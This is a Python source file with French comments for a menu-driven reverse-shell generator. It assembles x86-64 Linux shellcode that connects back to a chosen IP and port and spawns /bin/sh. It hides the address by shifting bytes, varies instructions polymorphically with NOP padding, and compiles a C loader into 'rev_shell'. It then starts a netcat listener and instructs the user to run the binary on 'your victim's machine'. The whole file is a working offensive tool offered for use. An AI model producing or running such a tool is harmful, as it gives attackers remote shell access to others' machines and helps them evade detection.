import socket  # Importer le module socket pour les opérations réseau
import struct  # Importer le module struct pour la gestion des données binaires
import argparse  # Importer le module argparse pour l'analyse des arguments de ligne de commande
import tempfile  # Importer le module tempfile pour créer des fichiers temporaires
import os  # Importer le module os pour interagir avec le système d'exploitation
import random  # Importer le module random pour générer des nombres aléatoires
import subprocess  # Importer le module subprocess pour exécuter des sous-processus
import sys  # Importer le module sys pour les paramètres et fonctions spécifiques au système
from datetime import datetime  # Importer le module datetime pour les opérations de date et heure
from rich.console import Console  # Importer la classe Console de rich.console pour la sortie console enrichie
from rich.live import Live  # Importer la classe Live de rich.live pour les mises à jour en direct de la console
from rich.text import Text  # Importer la classe Text de rich.text pour la gestion du texte enrichi
import time  # Importer le module time pour les fonctions liées au temps
import bcrypt  # Importer le module bcrypt pour le hachage des mots de passe

console = Console() # Initialiser l'objet Console pour la sortie de texte enrichie

# Définir les sections de l'art ASCII pour l'effet de puzzle
sections = [
    """
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⡲⠟⠛⢉⣀⣨⣉⣉⠛⠚⠛⠷⣖⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⣠⠖⣯⠟⠋⣁⣤⣤⡶⡋⠀⢀⡄⠀⠉⠀⠀⠀⠀⠙⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⢠⣧⣵⠟⠋⠼⠋⠉⣠⢾⡇⢠⣾⡇⢧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠤⢴⣄⡀⠀⠀⢠⢋⣭⠏⣠⠊⠀⠀⣴⢃⣦⢷⢸⡇⠻⣆⡓⠦⠤⣤⡄⠀⠀⠀⠀⠀⠻⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⢻⣿⣿⣆⢠⣿⡿⠁⠞⠁⠀⠀⣰⠃⣼⣿⡼⢸⡇⠀⠀⠙⠷⣤⣘⠳⣤⣀⠀⣀⠀⠀⠸⡷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⢰⣿⣿⣿⡿⡟⠀⠀⠀⠀⠀⢠⡿⢸⣿⣷⡇⠀⢹⡄⠀⠀⠀⠀⠙⠳⠦⣍⡳⣌⠻⣆⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠸⣿⣿⣿⠟⠀⠀⠀⡀⠀⠐⡿⠁⣾⣿⣿⣽⠀⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⢳⡽⣆⢸⡄⠈⣻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⣿⣿⣿⠁⠀⠀⡾⢿⠀⢸⢁⣼⣿⣿⣿⣟⡄⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢞⢆⢳⡄⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⣇⠀⢸⣷⣿⠀⠀⠈⠀⡸⠀⡞⣻⣿⣟⣩⣾⣿⡿⣄⠀⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⢸⣟⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠹⣌⣿⠇⠀⠀⠀⡰⠁⢠⣳⣿⠛⣻⣿⣿⣿⢿⣿⣦⠀⢳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠘⡆⢿⣞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⢠⡏⠙⠂⠀⠀⠀⡇⠀⠀⢸⣟⣾⣿⣿⣿⣿⣿⣿⣿⢧⣀⠀⠈⠛⠓⠶⠲⠷⠛⠢⡀⢱⠸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠈⠙⢦⡀⠀⠀⢸⣹⣄⢠⡈⣿⡿⣯⣿⡿⣿⣿⣿⣿⡿⣿⣞⣶⣦⣤⣶⣦⣶⣶⣤⣈⠻⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⢰⠃⠀⠀⠘⢯⡞⡄⢹⣿⣾⣿⣟⣿⣿⣿⣿⣿⣽⢛⠏⣿⠹⡿⢻⠉⡟⣿⠻⣿⢿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⣤⣦⢀⡖⠀⠀⠀⠀⠻⣿⡿⡈⢿⣽⣿⣏⣿⣽⣿⣿⣿⡏⠈⡼⡿⢸⠁⣼⢠⡇⢣⠀⡾⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠛⠋⠃⡼⠬⢳⡀⠀⠀⣹⡇⠸⣆⢹⣃⣿⣿⣿⣿⣿⣿⣿⠎⠁⠀⢠⢰⢿⡜⡇⡄⢀⣿⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⢸⡀⠀⢸⡃⣠⢖⣿⡇⠀⢿⡞⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠇⠈⢸⣧⢺⢹⣸⢿⡸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⣦⣃⢠⣾⠟⠁⣼⣿⣇⠀⠘⣷⢿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡂⠀⠘⡟⢸⢸⡇⠸⠃⠉⠀⠀⠀⠀⠈⠳⡀⠀⠀⠀⠀
		⠀⠀⢻⡼⠿⠁⠀⢰⣿⣿⣿⡆⠀⣿⣼⣿⡿⣿⣿⣿⣿⣙⠛⣿⠛⣻⣶⣤⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀
		⠀⠀⣼⠁⠀⠀⣠⣿⣻⣿⣿⣆⠀⠸⣿⣷⠿⣿⣿⣿⣿⣾⣤⢨⡙⣳⢼⠑⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⠀⠀
		⡶⠋⠁⠀⡠⣴⡿⠟⠉⠉⠉⠻⣦⠀⠘⣿⡿⢽⣿⢿⣿⣿⣿⣾⣿⣿⣤⡙⢮⣻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀
		⠀⠀⠀⢨⡿⠃⠀⠀⠀⠀⠀⠀⠘⢧⡀⢸⣿⣿⣒⣯⡿⢿⣿⣿⣿⣿⡽⣿⡅⠙⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀
		⠀⠀⢲⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠙⣿⣍⣴⢾⣿⣿⣿⣿⣿⣿⡵⢟⣆⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀
		⠀⢀⡨⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠘⢷⣯⠽⣺⢟⢿⣿⣿⣿⣦⣪⡚⢆⠚⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣞⣿⠀
		⠈⠏⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠘⣿⣯⡵⢡⣾⢻⣿⣿⣿⣿⣷⡈⣳⡤⠻⡄⠀⠀⠀⠀⠀⠀⣠⣾⣿⠃⠀
		⠛⠤⢴⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠘⣿⣷⣯⢃⡏⣸⣿⠻⣿⣿⣿⣇⡹⣌⠨⢷⣄⡀⣀⣠⣾⣿⠟⠁⢀⡀
		⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡂⠈⠛⠿⣿⣶⣧⡇⡿⣹⢯⣿⡿⢇⠞⠓⠦⠤⠭⠽⠟⡋⠁⠀⣰⠋⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣄⡀⠀⠈⠻⢿⣿⣷⣷⣿⣶⡞⠁⠀⠀⠀⠀⠀⠀⣄⢧⠀⣺⠃⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠺⣧⣄⠀⠀⠀⠉⠻⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⡿⣻⢷⠇⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠢⠤⠤⣤⣤⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """,
    """
    
		                                :                         
		          ,;L.                 t#,                        
		        f#i EW:        ,ft    ;##W.                       
		      .E#t  E##;       t#E   :#L:WE             ..       :
	 t      .DD. i#W,   E###t      t#E  .KG  ,#D           ,W,     .Et
	 EK:   ,WK. L#D.    E#fE#f     t#E  EE    ;#f         t##,    ,W#t
	 E#t  i#D :K#Wfff;  E#t D#G    t#E f#.     t#i       L###,   j###t
	 E#t j#f  i##WLLLLt E#t  f#E.  t#E :#G     GK      .E#j##,  G#fE#t
	 E#tL#i    .E#L     E#t   t#K: t#E  ;#L   LW.     ;WW; ##,:K#i E#t
	 E#WW,       f#E:   E#t    ;#W,t#E   t#f f#:     j#E.  ##f#W,  E#t
	 E#K:         ,WW;  E#t     :K#D#E    f#D#;    .D#L    ###K:   E#t
	 ED.           .D#; E#t      .E##E     G#t    :K#t     ##D.    E#t
	 t               tt ..         G#E      t     ...      #G      .. 
		                        fE                     j          
		                         ,                                ⠀
    """
    """							Made by : Mahmoud BOUJBIRI
    """,
]

# Séparateur pour la sortie console visuelle
separator = "-" * 80

# Chemin du fichier de journalisation
log_file_path = 'attack_log.txt'

# Identifiants utilisateur (mot de passe haché pour la sécurité)
USERNAME = "admin"
PASSWORD_HASH = bcrypt.hashpw("password".encode(), bcrypt.gensalt())

# Fonction pour authentifier l'utilisateur
def authenticate():
    username = input("Enter username: ")  # Demander le nom d'utilisateur
    password = input("Enter password: ")  # Demander le mot de passe

    # Vérifier si le nom d'utilisateur et le mot de passe sont corrects
    if username == USERNAME and bcrypt.checkpw(password.encode(), PASSWORD_HASH):
        display_green("Authentication successful!")  # Afficher le message de succès
        log_auth_attempt(username, True)  # Journaliser la tentative d'authentification réussie
        return True
    else:
        display_red("Authentication failed!")# Afficher le message d'échec
        log_auth_attempt(username, False)  # Journaliser la tentative d'authentification échouée
        return False

## Fonction pour afficher le texte en vert
def display_green(text):
    print(f"\033[92m{text}\033[0m")  # Imprimer le texte en vert

# Fonction pour afficher le texte en jaune
def display_yellow(text):
    print(f"\033[93m{text}\033[0m")  # Imprimer le texte en jaune

# Fonction pour afficher le texte en rouge
def display_red(text):
    print(f"\033[91m{text}\033[0m")  # Imprimer le texte en rouge

# Fonction pour ajouter un à un octet (modulo 256)
def add_one_to_byte(byte):
    return (byte + 1) % 256  # Ajouter un à l'octet et retourner modulo 256

# Fonction pour soustraire un à un octet (modulo 256)
def sub_one_from_byte(byte):
    return (byte - 1) % 256  # Soustraire un à l'octet et retourner modulo 256

# Fonction pour convertir une adresse IP en hexadécimal
def ip_to_hex(ip):
    try:
        packed_ip = socket.inet_aton(ip)  # Convertir l'IP au format binaire
        incremented = [add_one_to_byte(b) for b in packed_ip]  # Incrémenter chaque octet
        incremented.reverse()  # Inverser l'ordre des octets
        return ''.join(f"{b:02x}" for b in incremented)  # Convertir en chaîne hexadécimale
    except socket.error as e:
        display_green(f"Failed to encode IP '{ip}': {e}") # Afficher le message d'erreur si l'encodage de l'IP échoue
        return None

# Fonction pour convertir un port en hexadécimal
def port_to_hex(port):
    packed_port = struct.pack('<H', port)  # Convertir le port au format binaire (2 octets)
    incremented = [add_one_to_byte(b) for b in packed_port]  # Incrémenter chaque octet
    return ''.join(f"{b:02x}" for b in incremented)  # Convertir en chaîne hexadécimale

# Fonction pour convertir une adresse IP hexadécimale en adresse IP
def hex_to_ip(encoded_ip):
    bytes_ip = [encoded_ip[i:i+2] for i in range(0, len(encoded_ip), 2)]  # Diviser en octets
    decoded_ip = [str(sub_one_from_byte(int(b, 16))) for b in bytes_ip]  # Décrémenter chaque octet et convertir en chaîne
    decoded_ip.reverse()  # Reconstruire l'adresse IP dans le bon ordre
    return '.'.join(decoded_ip)  # Reconstruire l'adresse IP
    
# Fonction pour convertir un port hexadécimal en port
def hex_to_port(encoded_port):
    bytes_port = [encoded_port[i:i+2] for i in range(0, len(encoded_port), 2)]  # Diviser en octets
    decoded_port = [sub_one_from_byte(int(b, 16)) for b in reversed(bytes_port)]  # Décrémenter chaque octet et inverser l'ordre
    return (decoded_port[0] << 8) + decoded_port[1]  # Reconstruire le port

# Fonction pour générer une série d'instructions "nop" (no-operation)
def generate_no_operations(count):
    return 'nop\n' * count  # Générer une chaîne d'instructions "nop"

# Dictionnaire des remplacements polymorphes pour diverses instructions d'assembleur
polymorphic_replacements = {
    'xor rax, rax': ['sub rax, rax', 'xor rax, rax'],  # Remplacement pour l'instruction 'xor rax, rax'
    'xor rbx, rbx': ['sub rbx, rbx', 'xor rbx, rbx'],  # Remplacement pour l'instruction 'xor rbx, rbx'
    'xor rcx, rcx': ['sub rcx, rcx', 'xor rcx, rcx'],  # Remplacement pour l'instruction 'xor rcx, rcx'
    'xor rdx, rdx': ['sub rdx, rdx', 'xor rdx, rdx'],  # Remplacement pour l'instruction 'xor rdx, rdx'
    'xor rdi, rdi': ['sub rdi, rdi', 'xor rdi, rdi'],  # Remplacement pour l'instruction 'xor rdi, rdi'
    'xor rsi, rsi': ['sub rsi, rsi', 'xor rsi, rsi'],  # Remplacement pour l'instruction 'xor rsi, rsi'
    'mov al, 33': ['mov al, 33', 'xor rax, rax\nadd al, 33', 'push 33\npop rax'],  # Remplacement pour l'instruction 'mov al, 33'
    'push r8': ['push r8', 'sub rsp, 8\nmov [rsp], r8'],  # Remplacement pour l'instruction 'push r8'
    'pop rdi': ['pop rdi', 'mov rdi, [rsp]\nadd rsp, 8'],  # Remplacement pour l'instruction 'pop rdi'
    'mov sil, 1': ['mov sil, 1', 'xor rsi, rsi\nadd sil, 1'],  # Remplacement pour l'instruction 'mov sil, 1'
    'syscall': ['syscall', 'db 0x0f, 0x05']  # Remplacement pour l'instruction 'syscall'
}


# Fonction pour choisir aléatoirement une instruction polymorphe
def randomize_instruction(instruction):
    return random.choice(polymorphic_replacements.get(instruction, [instruction]))  # Choisir aléatoirement un remplacement polymorphe

# Fonction pour compiler le shellcode à partir du code assembleur
def compile_shellcode(asm_code):
    with tempfile.NamedTemporaryFile(delete=False, suffix='.asm') as asm_file:
        asm_file.write(asm_code.encode())  # Écrire le code assembleur dans un fichier temporaire
        asm_filename = asm_file.name

    obj_file = tempfile.mktemp(suffix='.o')  # Créer un fichier objet temporaire
    subprocess.run(['nasm', '-f', 'elf64', '-o', obj_file, asm_filename], check=True) # Compiler le code assembleur en fichier objet
    
    bin_file = tempfile.mktemp() # Créer un fichier binaire temporaire
    subprocess.run(['ld', '-o', bin_file, obj_file], check=True) # Lier le fichier objet pour créer le binaire
    
    result = subprocess.run(['objdump', '-d', bin_file], capture_output=True, text=True) # Désassembler le binaire pour obtenir les opcodes
    opcodes = []
    for line in result.stdout.split('\n'):
        if '\t' in line and ':' in line:
            parts = line.split('\t')
            if len(parts) > 1:
                opcode_parts = parts[1].strip().split(' ')
                opcodes.extend([op for op in opcode_parts if len(op) == 2 and all(c in "0123456789abcdef" for c in op)])

    formatted_opcodes = ''.join(f"\\x{op}" for op in opcodes if op) # Formater les opcodes pour le shellcode
    return formatted_opcodes

# Fonction pour construire le shellcode à partir de l'IP et du port donnés
def build_shellcode(ip, port):
    encoded_ip = ip_to_hex(ip)  # Encoder l'adresse IP en hexadécimal
    encoded_port = port_to_hex(port)  # Encoder le port en hexadécimal

    # Code assembleur pour le shellcode
    asm_code = f"""
global _start  

section .text  

_start:  
    {randomize_instruction('xor rax, rax')}  
    {randomize_instruction('xor rbx, rbx')}  
    {randomize_instruction('xor rcx, rcx')}  
    {randomize_instruction('xor rdx, rdx')}  
    {randomize_instruction('xor rdi, rdi')}  
    {randomize_instruction('xor rsi, rsi')}  
    {generate_no_operations(random.randint(1, 10))}  
    mov al, 41  
    mov dil, 2  
    mov sil, 1  
    mov dl, 6  
    syscall  
    {generate_no_operations(random.randint(1, 10))}  
    mov r8, rax  
    sub rsp, 40  
    mov byte [rsp], 0x2  
    mov word [rsp+2], 0x{encoded_port}  
    sub word [rsp+2], 0x0101  
    mov dword [rsp+4], 0x{encoded_ip} 
    sub dword [rsp+4], 0x01010101  
    mov rsi, rsp  
    mov dl, 16  
    push r8  
    pop rdi 
    mov al, 42  
    syscall 
    {generate_no_operations(random.randint(1, 10))}  
    {randomize_instruction('mov al, 33')}  
    {randomize_instruction('push r8')}  
    {randomize_instruction('pop rdi')}  
    {randomize_instruction('xor rsi, rsi')}  
    {randomize_instruction('syscall')}  
    {generate_no_operations(random.randint(1, 10))}  
    {randomize_instruction('mov al, 33')}  
    {randomize_instruction('push r8')} 
    {randomize_instruction('pop rdi')}  
    {randomize_instruction('mov sil, 1')}  
    {randomize_instruction('syscall')} 
    {randomize_instruction('mov al, 33')}  
    {randomize_instruction('push r8')}  
    {randomize_instruction('pop rdi')} 
    {randomize_instruction('mov sil, 2')} 
    {randomize_instruction('syscall')} 
    xor rsi, rsi  
    push rsi  
    mov rdi, 0x68732f2f6e69622f  
    push rdi 
    push rsp  
    pop rdi 
    mov al, 59 
    cdq  
    syscall  
    """

    shellcode = compile_shellcode(asm_code) # Compiler le shellcode
    display_green(f"Shellcode Length: {len(shellcode)//4}") # Afficher la longueur du shellcode
    log_attack(ip, port, shellcode) # Journaliser l'attaque
    return shellcode

# Fonction pour générer un fichier C contenant le shellcode
def generate_c_file(shellcode):
    c_code = f'''
#include <stdio.h> // Inclure la bibliothèque standard d'entrée/sortie
#include <string.h> // Inclure la bibliothèque de manipulation de chaînes de caractères
#include <sys/mman.h> // Inclure la bibliothèque pour la gestion de la mémoire

char shellcode[] = "{shellcode}"; // Définir une chaîne contenant le shellcode

int main() {{
    // Afficher la longueur du shellcode
    printf("Shellcode Length: %zu\\n", strlen(shellcode));
    
    // Allouer de la mémoire exécutable
    void *exec_mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    // Vérifier si l'allocation de mémoire a échoué
    if (exec_mem == MAP_FAILED) {{
        perror("mmap"); // Afficher un message d'erreur
        return 1; // Retourner 1 pour indiquer une erreur
    }}
    // Copier le shellcode dans la mémoire allouée
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    // Convertir l'adresse de la mémoire en fonction et l'exécuter
    ((void(*)())exec_mem)();
    // Retourner 0 pour indiquer que le programme s'est terminé avec succès
    return 0;
}}
'''
    with open('shell_payload.c', 'w') as f:
        f.write(c_code)  # Écrire le code C dans un fichier

# Fonction pour compiler le fichier C en exécutable
def compile_c_source():
    subprocess.run(['gcc', 'shell_payload.c', '-o', 'rev_shell', '-z', 'execstack'], check=True) # Compiler le fichier C en exécutable

# Fonction pour journaliser les tentatives d'authentification
def log_attack(ip, port, shellcode):
    with open(log_file_path, 'a') as log_file:
        log_file.write(f"{datetime.now()} - IP: {ip}, Port: {port}, Shellcode: {shellcode}\n") # Écrire les détails de la tentative d'authentification dans le fichier de journalisation

# Function to log authentication attempts
def log_auth_attempt(username, success):
    with open(log_file_path, 'a') as log_file:
        status = "successful" if success else "failed"
        log_file.write(f"{datetime.now()} - Username: {username}, Authentication: {status}\n")

# Fonction pour afficher le contenu du fichier de journalisation
def view_logs():
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r') as log_file:
            logs = log_file.read()
            print(separator)
            print("Attack Logs:")
            print(logs)
            print(separator)
    else:
        print("No logs available.")

# Fonction principale pour orchestrer la génération de shellcode et la création de binaire
def main():
    displayed_sections = []
    
    with Live(console=console, refresh_per_second=1) as live:
        for section in sections:
            displayed_sections.append(section)
            text = Text("\n".join(displayed_sections), justify="center", style="bold red")
            live.update(text)
            time.sleep(0.5)
    
    display_green(separator)

    # Authentifier l'utilisateur
    if not authenticate():
        return

    latest_port = None

    while True:
        print("Choose an option:")
        print("1. Provide IP and port")
        print("2. Run nc -lvnp on the latest port")
        print("3. View logs")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            ip = input("Enter the IP address: ")
            port = int(input("Enter the port number: "))
            latest_port = port
            shellcode = build_shellcode(ip, port)
            display_green(f"Generated Shellcode: {shellcode}")

            encoded_ip = ip_to_hex(ip)
            encoded_port = port_to_hex(port)
            display_yellow(f"Encoded IP: {encoded_ip}")
            display_yellow(f"Encoded Port: {encoded_port}")

            decoded_ip = hex_to_ip(encoded_ip)
            decoded_port = hex_to_port(encoded_port)
            display_yellow(f"Decoded IP: {decoded_ip}")
            display_yellow(f"Decoded Port: {decoded_port}")

            generate_c_file(shellcode)
            compile_c_source()

            display_green("C file 'shell_payload.c' compiled to 'rev_shell'")
            display_green(separator)
            display_yellow("To use the reverse shell:")
            display_yellow("1. Start a Netcat listener by selecting the option 2")
            display_yellow("2. Run the compiled reverse shell on your victim's machine: ./rev_shell")
        
        elif choice == '2':
            if latest_port is not None:
                subprocess.run(['nc', '-lvnp', str(latest_port)])
      
                display_red("No port information available. Please provide an IP and port first.")
        
        elif choice == '3':
            view_logs()

        elif choice == '4':
            display_green("Exiting...")
            break
        
        else:
            display_yellow("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
